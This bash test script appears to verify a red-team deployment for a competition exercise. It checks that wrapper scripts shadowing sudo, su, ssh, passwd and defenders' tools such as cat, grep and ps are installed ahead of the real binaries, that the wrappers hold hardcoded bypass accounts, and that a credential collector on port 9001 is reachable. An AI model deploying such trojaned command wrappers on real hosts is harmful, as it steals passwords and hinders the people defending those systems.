#!/bin/bash
# test_deploy.sh — simulate a deployment and verify wrappers are correctly installed
# Run this AFTER deploying wrappers to a target host.
# Non-destructive: only reads filesystem state and runs harmless commands.
set -u
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/test_helpers.sh"

echo "=== Post-deployment verification ==="
echo ""

WRAPPER_DIR="/usr/local/bin"

# ==================================================================
echo "--- Wrapper installation checks ---"

EXPECTED_CRED_WRAPPERS=(sudo su ssh passwd)
EXPECTED_DEFENSE_WRAPPERS=(
    cat grep ls find file stat diff less more strings
    md5sum sha256sum which chmod chown cp mv rm kill
    ps systemctl ufw iptables iptables-save
)
# Combine
ALL_WRAPPERS=("${EXPECTED_CRED_WRAPPERS[@]}" "${EXPECTED_DEFENSE_WRAPPERS[@]}")

for cmd in "${ALL_WRAPPERS[@]}"; do
    WRAPPER="$WRAPPER_DIR/$cmd"
    if [ -f "$WRAPPER" ]; then
        echo -e "  ${GRN}PASS${RST}  installed: $cmd"
        ((PASS++))

        # Check it's executable
        if [ -x "$WRAPPER" ]; then
            echo -e "  ${GRN}PASS${RST}  executable: $cmd"
            ((PASS++))
        else
            echo -e "  ${RED}FAIL${RST}  not executable: $cmd"
            ((FAIL++))
        fi

        # Check it's a shell script (not a dangling symlink or binary)
        if head -1 "$WRAPPER" 2>/dev/null | grep -q '^#!/bin/bash'; then
            echo -e "  ${GRN}PASS${RST}  bash shebang: $cmd"
            ((PASS++))
        else
            echo -e "  ${RED}FAIL${RST}  missing bash shebang: $cmd"
            ((FAIL++))
        fi
    else
        echo -e "  ${RED}FAIL${RST}  missing: $cmd"
        ((FAIL++))
    fi
done

# ==================================================================
echo ""
echo "--- PATH precedence checks ---"
# /usr/local/bin must come before /usr/bin and /bin in PATH
LOCAL_POS=$(echo "$PATH" | tr ':' '\n' | grep -n '/usr/local/bin' | head -1 | cut -d: -f1)
USR_POS=$(echo "$PATH" | tr ':' '\n' | grep -n '^/usr/bin$' | head -1 | cut -d: -f1)
BIN_POS=$(echo "$PATH" | tr ':' '\n' | grep -n '^/bin$' | head -1 | cut -d: -f1)

if [ -n "$LOCAL_POS" ]; then
    echo -e "  ${GRN}PASS${RST}  /usr/local/bin in PATH (position $LOCAL_POS)"
    ((PASS++))

    if [ -n "$USR_POS" ] && [ "$LOCAL_POS" -lt "$USR_POS" ]; then
        echo -e "  ${GRN}PASS${RST}  /usr/local/bin before /usr/bin"
        ((PASS++))
    elif [ -n "$USR_POS" ]; then
        echo -e "  ${RED}FAIL${RST}  /usr/local/bin AFTER /usr/bin — wrappers won't shadow!"
        ((FAIL++))
    fi
else
    echo -e "  ${RED}FAIL${RST}  /usr/local/bin NOT in PATH"
    ((FAIL++))
fi

# ==================================================================
echo ""
echo "--- which resolution checks ---"
# Verify 'which' resolves to our wrapper, not the real binary
for cmd in sudo cat grep ls; do
    RESOLVED=$(/usr/bin/which "$cmd" 2>/dev/null || command -v "$cmd" 2>/dev/null)
    if [ "$RESOLVED" = "$WRAPPER_DIR/$cmd" ]; then
        echo -e "  ${GRN}PASS${RST}  which $cmd -> wrapper"
        ((PASS++))
    else
        echo -e "  ${RED}FAIL${RST}  which $cmd -> $RESOLVED (expected $WRAPPER_DIR/$cmd)"
        ((FAIL++))
    fi
done

# ==================================================================
echo ""
echo "--- Real binary discovery ---"
# Each wrapper needs to find the REAL binary. Check they exist.
for cmd in sudo su ssh passwd cat grep ls find file stat diff less more \
           strings md5sum sha256sum which chmod chown cp mv rm kill \
           ps systemctl ufw iptables iptables-save; do
    REAL=""
    for p in /usr/bin/$cmd /bin/$cmd /usr/sbin/$cmd /sbin/$cmd; do
        if [ -x "$p" ]; then
            REAL="$p"
            break
        fi
    done
    if [ -n "$REAL" ]; then
        echo -e "  ${GRN}PASS${RST}  real binary: $cmd -> $REAL"
        ((PASS++))
    else
        # Some may genuinely not be installed (ufw, iptables)
        echo -e "  ${YLW}SKIP${RST}  real binary not found: $cmd (may not be installed)"
        ((SKIP++))
    fi
done

# ==================================================================
echo ""
echo "--- Gray team bypass check ---"
# Verify the wrapper scripts contain the gray team accounts
GRAY_ACCOUNTS=("kingneptune" "paintythepirate" "greyteamadmin")
for wrapper in "$WRAPPER_DIR"/sudo "$WRAPPER_DIR"/cat "$WRAPPER_DIR"/grep; do
    if [ ! -f "$wrapper" ]; then continue; fi
    BASENAME=$(basename "$wrapper")
    for acct in "${GRAY_ACCOUNTS[@]}"; do
        if /usr/bin/grep -q "$acct" "$wrapper" 2>/dev/null; then
            echo -e "  ${GRN}PASS${RST}  gray bypass: $BASENAME contains $acct"
            ((PASS++))
        else
            echo -e "  ${RED}FAIL${RST}  gray bypass: $BASENAME missing $acct"
            ((FAIL++))
        fi
    done
done

# ==================================================================
echo ""
echo "--- Credential collector connectivity ---"
# Check if cred_collector is running
COLLECT_HOST="${COLLECT_HOST:-127.0.0.1}"
COLLECT_PORT="${COLLECT_PORT:-9001}"
if curl -s -o /dev/null -w "%{http_code}" "http://$COLLECT_HOST:$COLLECT_PORT/" 2>/dev/null | grep -q "200\|404\|405"; then
    echo -e "  ${GRN}PASS${RST}  collector reachable at $COLLECT_HOST:$COLLECT_PORT"
    ((PASS++))
else
    echo -e "  ${YLW}SKIP${RST}  collector not reachable at $COLLECT_HOST:$COLLECT_PORT"
    ((SKIP++))
fi

# ==================================================================
echo ""
echo "--- No ANSIBLE_REMOTE_TEMP bypass ---"
# Verify no wrapper has the ANSIBLE bypass
ANSIBLE_HITS=$(/usr/bin/grep -rl "ANSIBLE_REMOTE_TEMP" "$WRAPPER_DIR"/ 2>/dev/null | wc -l)
if [ "$ANSIBLE_HITS" -eq 0 ]; then
    echo -e "  ${GRN}PASS${RST}  no ANSIBLE_REMOTE_TEMP bypass in any wrapper"
    ((PASS++))
else
    echo -e "  ${RED}FAIL${RST}  $ANSIBLE_HITS wrappers still have ANSIBLE_REMOTE_TEMP"
    /usr/bin/grep -rl "ANSIBLE_REMOTE_TEMP" "$WRAPPER_DIR"/ 2>/dev/null
    ((FAIL++))
fi

# ==================================================================
echo ""
echo "--- Bash syntax validation ---"
# Run bash -n on every wrapper to catch syntax errors
SYNTAX_FAILS=0
for wrapper in "$WRAPPER_DIR"/*; do
    [ -f "$wrapper" ] || continue
    head -1 "$wrapper" 2>/dev/null | /usr/bin/grep -q '^#!/bin/bash' || continue
    if ! bash -n "$wrapper" 2>/dev/null; then
        echo -e "  ${RED}FAIL${RST}  syntax error: $(basename "$wrapper")"
        ((FAIL++))
        ((SYNTAX_FAILS++))
    fi
done
if [ $SYNTAX_FAILS -eq 0 ]; then
    echo -e "  ${GRN}PASS${RST}  all wrappers pass bash -n syntax check"
    ((PASS++))
fi

# ==================================================================
echo ""
echo "--- Protected port check ---"
# Verify no wrapper tries to touch competition-protected ports
PROTECTED_PORTS="21115 21116 21117 21118 21119 3389 8443"
BAD_PORT_HITS=0
for wrapper in "$WRAPPER_DIR"/*; do
    [ -f "$wrapper" ] || continue
    for port in $PROTECTED_PORTS; do
        if /usr/bin/grep -q "$port" "$wrapper" 2>/dev/null; then
            echo -e "  ${RED}FAIL${RST}  $(basename "$wrapper") references protected port $port"
            ((FAIL++))
            ((BAD_PORT_HITS++))
        fi
    done
done
if [ $BAD_PORT_HITS -eq 0 ]; then
    echo -e "  ${GRN}PASS${RST}  no wrapper references protected ports"
    ((PASS++))
fi

echo ""
summary
